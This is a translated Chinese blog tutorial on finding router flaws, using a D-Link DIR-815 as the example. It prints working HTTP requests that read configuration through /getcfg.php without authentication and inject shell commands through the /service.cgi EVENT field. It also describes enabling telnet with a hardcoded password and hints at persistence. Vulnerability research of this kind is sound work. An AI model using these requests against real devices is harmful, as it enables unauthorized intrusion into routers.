> 原文链接: https://www.anquanke.com//post/id/94196 


# 以D-Link为例教你如何挖掘漏洞


                                阅读量   
                                **223594**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">2</a>
                                </b>
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



##### 译文声明

本文是翻译文章，文章原作者cr0n1c，文章来源：cr0n1c.wordpress.com
                                <br>原文地址：[https://cr0n1c.wordpress.com/2018/01/08/exploiting-cheap-labor/](https://cr0n1c.wordpress.com/2018/01/08/exploiting-cheap-labor/)

译文仅供参考，具体内容表达以及含义原文为准

[![](https://p2.ssl.qhimg.com/t01d3e6bd7be8b55ef5.png)](https://p2.ssl.qhimg.com/t01d3e6bd7be8b55ef5.png)



## 一、前言

聪明的人喜欢说：“一分价钱一分货”，这道理对编程来说同样适用。就我个人而言，我更喜欢能以较少代价获取廉价产品的那些商店。话虽如此，圣诞节期间我倍感无聊，决定扔掉许多老旧硬件。在扔掉这些硬件之前，我灵机一动，想给其中一些硬件来次模糊测试（fuzz）。本文介绍了我在24小时内（关键工作仅花了4小时时间）对D-Link 815N设备的研究结果。

授人予鱼不如授人予渔，本文的目的并不是向大家介绍一个可以用来干翻全世界的0Day漏洞，而是介绍寻找这些漏洞的一种方法。

**声明：**我花了几分钟时间翻了翻D-Link官网，并没有在官网找到提交漏洞的地方。

[![](https://p5.ssl.qhimg.com/t013450aa6a922fcbc9.jpg)](https://p5.ssl.qhimg.com/t013450aa6a922fcbc9.jpg)



## 二、扫描目标设备

这个步骤中最难的一关其实是找到这款路由器的电源线。启动路由器、接入开发环境后，第一要务就是找到正确的登录密码。这方面Dlink非常慷慨，使用的用户名为`admin`，没有密码。

接下来，我启用了路由器的“Remote Management（远程管理）”功能，这样就能模拟通过互联网访问该路由器的应用场景。然后我使用了`netcat`工具，简单探测访问远程管理接口时能得到哪些指纹信息（banner），返回结果如下所示：

```
nc 10.0.0.1 8080
HEAD / HTTP/1.1

HTTP/1.1 400 Bad Request
Server: Linux, HTTP/1.1, DIR-815 Ver 1.03
Date: Sat, 27 Jan 2001 02:48:12 GMT
```

在[Shodan.io](https://www.shodan.io/search?query=Server%3A+Linux%2C+HTTP%2F1.1%2C+DIR-815)上查询关键字后，我发现大约有700个设备会返回同样的信息。



## 三、理解工作原理

进展到这一步后，我想要了解这款路由器如何实现身份认证、如何加载页面。为了完成这一任务，我在Chrome浏览器中启用了开发者工具（Firefox同样支持该功能），开始观察“network”标签页的输出结果。成功登录时，我发现浏览器会向`/session.cgi`路径发送一个POST请求，返回结果为简单的XML数据（其中不包含与会话（session）有关的信息）。

```
nc 10.0.0.1 8080
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Host: localhost
Cookie: uid=DumMyTokEN
Content-Length: 68

ACTION=login_plaintext&amp;PASSWD=&amp;CAPTCHA=&amp;USER=admin&amp;REPORT_METHOD=xml

HTTP/1.1 200 OK
Server: Linux, HTTP/1.1, DIR-815 Ver 1.03
Date: Sat, 27 Jan 2001 04:59:08 GMT
Transfer-Encoding: chunked
Content-Type: text/xml

a1
&lt;?xml version=”1.0″ encoding=”utf-8″?&gt;
&lt;report&gt;
&lt;RESULT&gt;SUCCESS&lt;/RESULT&gt;
&lt;REASON&gt;&lt;/REASON&gt;
&lt;AUTHORIZED_GROUP&gt;0&lt;/AUTHORIZED_GROUP&gt;
&lt;PELOTA&gt;&lt;/PELOTA&gt;
&lt;/report&gt;
0
```

知道这一点后，我不禁有点小激动，因为这表明设备开发者可能只通过cookie来实现认证，而cookie正是我可以操控的变量。如果这些开发者的确这么懒惰，也许我可以不经过身份认证就能访问某些页面。

浏览几分钟后，我注意到一个PHP页面，许多页面中会引用这个页面。我开始使用Chrome以及开发者工具抓取相关的POST请求，然后在netcat中重放这些请求（未附加cookie）。

我找到了一处非常有趣的信息：`DEVICE.ACCOUNT`，这也是我的最爱（稍后扫描程序可以使用这个信息来检查默认凭据）。

```
POST /getcfg.php HTTP/1.1
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Host: localhost
Content-Length: 23

SERVICES=DEVICE.ACCOUNT

HTTP/1.1 200 OK
Server: Linux, HTTP/1.1, DIR-815 Ver 1.03
Date: Sat, 27 Jan 2001 05:07:42 GMT
Transfer-Encoding: chunked
Content-Type: text/xml

208
&lt;?xml version=”1.0″ encoding=”utf-8″?&gt;
&lt;postxml&gt;
&lt;module&gt;
&lt;service&gt;DEVICE.ACCOUNT&lt;/service&gt;
&lt;device&gt;
&lt;account&gt;
&lt;seqno&gt;&lt;/seqno&gt;
&lt;max&gt;1&lt;/max&gt;
&lt;count&gt;1&lt;/count&gt;
&lt;entry&gt;
&lt;name&gt;admin&lt;/name&gt;
&lt;password&gt;&lt;/password&gt;
&lt;group&gt;0&lt;/group&gt;
&lt;description&gt;&lt;/description&gt;
&lt;/entry&gt;
&lt;/account&gt;
&lt;session&gt;
&lt;captcha&gt;0&lt;/captcha&gt;
&lt;dummy&gt;dummy&lt;/dummy&gt;
&lt;timeout&gt;600&lt;/timeout&gt;
&lt;maxsession&gt;128&lt;/maxsession&gt;
&lt;maxauthorized&gt;16&lt;/maxauthorized&gt;
&lt;/session&gt;
&lt;/device&gt;
&lt;/module&gt;
&lt;/postxml&gt;
0

```

如果用户设置了密码，那么上述结果中`&lt;password&gt;`会变成`==OoXxGgYy==`。在这里我总共花了10分钟，终于找到了不需要通过身份认证来扫描目标设备的一种方法，可以得到路由器所有接口的信息、连接到路由器的设备以及这些设备所对应的流量、DNS信息、日志信息等等。大家可以在我的[Github](https://github.com/Cr0n1c/router_pwner/blob/master/scanners/dlink.py)上找到完整列表。



## 四、拿到shell

此时我已经投入了几个小时的时间，发现这款路由器就像一个“超级商店”那样可以给我们提供许多有用的信息。然而，当我把这些成果展示给某位朋友时，他对此非常不屑，我还记得他说过的那句话：“如果真的那么简单，那么拿一个shell给我看看！”

这句话把我推向了下一个环节，那就是确认路由器开发者是不是没有对输入进行验证。于是我再次浏览一些页面，搜寻带有执行功能的目标网址，机缘巧合下，我找到了使用`/service.cgi`的一个防火墙配置页面。观察POST请求后，我决定在正常提交数据后面追加一个`&amp;`符号以及`ls`命令，然后再次提交请求（当然还要传入用于身份认证的cookie值），结果如下：

```
root@kali:~# nc 10.0.0.1 8080
POST /service.cgi HTTP/1.1
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Host: localhost
Content-Length: 21
Cookie: uid=DuMMyTokEN

EVENT=CHECKFW%26ls%26

HTTP/1.1 200 OK
Server: Linux, HTTP/1.1, DIR-815 Ver 1.03
Date: Sat, 27 Jan 2001 09:25:03 GMT
Transfer-Encoding: chunked
Content-Type: text/xml

64
&lt;?xml version=”1.0″ encoding=”utf-8″?&gt;
&lt;report&gt;
&lt;result&gt;OK&lt;/result&gt;
&lt;message&gt;&lt;/message&gt;
&lt;/report&gt;

4
cbwpsacts.php
wiz_wps.php
wiz_wlan.php
wiz_wan_fresetv6.php
wiz_wan.php
wifi_stat.php
… &lt;You get the point&gt;
0
```

大功告成。



## 五、综合利用

可以说，此时我们已经找到了一个RCE（远程代码执行）漏洞，但我们还需要通过身份认证，这一点无需担心，我们可以使用某种方法未授权访问这款路由器，具体方法留给读者来挖掘。

最后，我想把前面几个步骤融入一个快速利用脚本中，这样我们无需敲入许多命令就可以与路由器远程交互，为此我写了一个[DLINK 815 Shell RCE](https://github.com/Cr0n1c/dlink_815_shell_poc/blob/master/dlink_auth_rce)程序。如果你对轻量级物联网（IoT）设备有所了解的话，你会注意到这些设备都会运行busybox，我们可以在上面运行熟悉的一些命令，这一点非常好。

那么，接下来我们可以做些啥？其实很简单，我们可以启用telnet功能，获得较为稳定的shell：

```
/bin/cat /etc/init0.d/S80telnetd.sh
#!/bin/sh
echo [$0]: $1 … &gt; /dev/console
if [ “$1” = “start” ];
then if [ -f “/usr/sbin/login” ];
then image_sign=`cat /etc/config/image_sign`
telnetd -l /usr/sbin/login -u Alphanetworks:$image_sign -i br0 &amp;
else
telnetd &amp;
fielse
killall telnetd
fi
```

**注意：**厂商非常亲民，已经将telnet密码硬编码在`/etc/config/image_sign`中。我对这些嵌入式设备的工作过程有点了解，因此我确信所有的D-Link 815N设备都会采用同样的密码。



## 六、临时驻留

我知道在这些设备上的实现驻留并没有太大意义，但我找不到更合适的名词来阐述这个概念。这些设备不经常重启，并且当它们启动时，在正常运行前会重新释放设备固件。这意味着当设备重启时，我们放在设备上的所有痕迹也会随风而逝，但毕竟设备不经常重启，我们可以不用在意这个细节。

我并不会公布具体代码，但如果你对Linux以及`echo`命令比较熟悉，那么你应该能找到一种方法，使用python之类的工具读取某个二进制文件（如`netcat`），将结果以某种形式输出，然后将这些数据通过`echo -e`方式存放到设备上的某个位置（比如`/var/tmp`），这个过程中你需要了解目标设备的具体架构，可以参考[此处](https://github.com/darkerego/mips-binaries)了解更多信息。

**2018年1月8日更新：**来自Google的[消息](https://vuldb.com/?id.7843)表明，如果我们访问D-Link 645的`/getcfg.php`页面，那么我们就能拿到明文形式的密码。

将这个信息与`/service.cgi`结合起来，你就可以掌握一切！
